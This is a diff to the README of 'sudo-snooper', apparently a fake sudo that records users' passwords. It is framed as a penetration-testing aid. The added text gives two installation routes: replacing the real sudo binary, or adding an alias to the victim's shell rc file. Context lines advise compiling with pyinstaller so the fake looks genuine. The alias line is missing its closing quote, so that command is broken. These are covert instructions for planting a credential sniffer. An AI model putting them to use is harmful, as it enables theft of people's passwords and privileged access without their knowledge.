@@ -8,6 +8,7 @@ This can be useful in penetration tests or security evaluations for testing user
 
 ## Installation steps
 
+### Option 1 - Install in place of the real sudo
 * move the original sudo binary to another name
 
 ```
@@ -36,6 +37,18 @@ sudo = 'sudo'
 **NOTE**: A somewhat more convincing way to install this is to compile it using `pyinstaller` so that it doesn't show up as a python file when `file /usr/bin/sudo` is executed.
 
 To do that under Archlinux: `pyinstaller --onefile sudo-snooper.py` will work. However please note that once compiled you won't be able to change the parameters in the compiled binary.
+
+### Option 2 - Alias the sudo command
+
+This option is easier to do and more portable, however it might be more noticable to careful users.
+
+Edit the .rc file of the shell the user is using (can be .bashrc .zshrc and so on) and add the following:
+
+```
+alias sudo='python3.5 /path/to/sudo-snooper.py
+```
+
+Make sure sudo-snooper.py has the correct permissions.
 
 
 ## Usage:
